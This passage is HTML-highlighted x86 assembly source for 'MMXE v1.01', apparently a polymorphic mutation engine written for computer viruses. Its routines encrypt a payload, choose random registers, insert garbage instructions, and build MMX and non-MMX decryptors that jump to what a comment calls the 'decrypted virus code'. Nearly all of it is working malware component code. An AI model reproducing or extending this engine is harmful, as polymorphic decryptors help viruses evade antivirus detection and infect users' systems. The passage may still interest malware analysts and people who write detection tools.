</span><span class="sc5">_LOADSIZE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000000000000100b</span><span class="sc0">
</span><span class="sc5">_LOADPOINTER</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000000000001000b</span><span class="sc0">
</span><span class="sc5">_LOADKEY</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000000000010000b</span><span class="sc0">
</span><span class="sc5">_PASSKEY2MMX</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000000000100000b</span><span class="sc0">
</span><span class="sc5">_PASSPTR2MMX</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000000001000000b</span><span class="sc0">
</span><span class="sc5">_CRYPT</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000000010000000b</span><span class="sc0">
</span><span class="sc5">_PASSMMX2PTR</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000000100000000b</span><span class="sc0">
</span><span class="sc5">_INCPOINTER</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000001000000000b</span><span class="sc0">
</span><span class="sc5">_DECCOUNTER</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000010000000000b</span><span class="sc0">
</span><span class="sc5">_LOOP</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0000100000000000b</span><span class="sc0">

</span><span class="sc1">; [ POSITIONS ]</span><span class="sc0">

</span><span class="sc5">@CHECK4MMX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">@DELTAOFFSET</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">@LOADSIZE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">@LOADPOINTER</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc5">@LOADKEY</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">@PASSKEY2MMX</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">05h</span><span class="sc0">
</span><span class="sc5">@PASSPTR2MMX</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">06h</span><span class="sc0">
</span><span class="sc5">@CRYPT</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">07h</span><span class="sc0">
</span><span class="sc5">@PASSMMX2PTR</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">@INCPOINTER</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">09h</span><span class="sc0">
</span><span class="sc5">@DECCOUNTER</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">@LOOP</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Bh</span><span class="sc0">

</span><span class="sc1">; [ PUSHAD structure ]</span><span class="sc0">

</span><span class="sc5">PUSHAD_EDI</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ESI</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EBP</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ESP</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0Ch</span><span class="sc0">
</span><span class="sc5">PUSHAD_EBX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EDX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">14h</span><span class="sc0">
</span><span class="sc5">PUSHAD_ECX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">
</span><span class="sc5">PUSHAD_EAX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1Ch</span><span class="sc0">

</span><span class="sc5">RETURN_ADDRESS</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc1">; [ MMXE v1.01 ]</span><span class="sc0">

</span><span class="sc5">mmxe</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@init_mmxe</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@crypt_data</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_some_garbage</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_check4mmx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_some_garbage</span><span class="sc0">

</span><span class="sc1">; Generate the 5 parts of the decryptor that go before the loop</span><span class="sc0">

</span><span class="sc5">@@gb4l_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_some_garbage</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_before_loop</span><span class="sc0">
</span><span class="sc5">@@gb4l?</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_CHECK4MMX</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \             </span><span class="sc1">; Check if all flags were </span><span class="sc0">
            </span><span class="sc5">_DELTAOFFSET</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \           </span><span class="sc1">; done ... (They should be,</span><span class="sc0">
            </span><span class="sc5">_LOADSIZE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \              </span><span class="sc1">; but i don't trust in my own</span><span class="sc0">
            </span><span class="sc5">_LOADPOINTER</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \           </span><span class="sc1">; code :)</span><span class="sc0">
            </span><span class="sc5">_LOADKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
            </span><span class="sc5">_PASSKEY2MMX</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@gb4l_</span><span class="sc0">
    
</span><span class="sc1">; Get the loop point</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@getloopaddress</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_some_garbage</span><span class="sc0">

</span><span class="sc1">; Generate the decryptor instructions that form the loop</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@after_looptbl</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">@@s_aftlooptbl</span><span class="sc0">
</span><span class="sc5">@@gal</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_some_garbage</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@gal</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LIMIT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ptr_buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc1">; And now generate the non-MMX decryptor</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ptrto2nd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@init_mmx?</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc5">_CHECK4MMX</span><span class="sc0">

</span><span class="sc5">@@gb4lx_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_some_garbage</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_before_loop_non_mmx</span><span class="sc0">

</span><span class="sc5">@@gb4lx?</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_CHECK4MMX</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \             </span><span class="sc1">; Check if all flags were </span><span class="sc0">
            </span><span class="sc5">_DELTAOFFSET</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \           </span><span class="sc1">; done ... (They should be,</span><span class="sc0">
            </span><span class="sc5">_LOADSIZE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \              </span><span class="sc1">; but i don't trust in my own</span><span class="sc0">
            </span><span class="sc5">_LOADPOINTER</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \           </span><span class="sc1">; code :)</span><span class="sc0">
            </span><span class="sc5">_LOADKEY</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@continue_with_this</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_CHECK4MMX</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \             </span><span class="sc1">; In strange files, i dunno</span><span class="sc0">
            </span><span class="sc5">_DELTAOFFSET</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \           </span><span class="sc1">; why, instead 1F, we must </span><span class="sc0">
            </span><span class="sc5">_LOADSIZE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \              </span><span class="sc1">; check for 3F... otherwise,</span><span class="sc0">
            </span><span class="sc5">_LOADPOINTER</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \           </span><span class="sc1">; all it goes to hell :(</span><span class="sc0">
            </span><span class="sc5">_LOADKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
            </span><span class="sc5">_PASSKEY2MMX</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@gb4lx_</span><span class="sc0">

</span><span class="sc5">@@continue_with_this</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_garbage</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@getloopaddress</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@after_l00ptbl</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">@@s_aftl00ptbl</span><span class="sc0">
</span><span class="sc5">@@galx</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@gen_some_garbage</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@galx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                         </span><span class="sc1">; Generate the JMP to the </span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; decrypted virus code</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LIMIT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ptr_buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Fill with shit the rest</span><span class="sc0">
</span><span class="sc5">@@FillTheRest</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@FillTheRest</span><span class="sc0">


    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@uninit_mmxe</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc3">"[MMXE v1.01]"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; --- Initialization &amp; Uninitialization routines</span><span class="sc0">

</span><span class="sc5">@@init_mmxe</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ptr_data2enc</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ptr_buffer</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@size2enc</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@size2cryptd4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@init_mmx?</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@flags</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@enc_key</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">@@get_key</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_key</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_key</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_key</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@get_ptr2data</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_ptr2data</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_ptr2data</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_EBP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_ptr2data</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_ptr2data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_ptr2data</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@get_counter</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_counter</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_counter</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_counter</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_counter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_counter</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@get_delta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_delta</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ESP</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_delta</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_delta</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_delta</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_delta</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@reg_delta</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@get_mmxptr2data</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@mmx_ptr2data</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@get_mmxkey</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@get_mmxkey</span><span class="sc0">
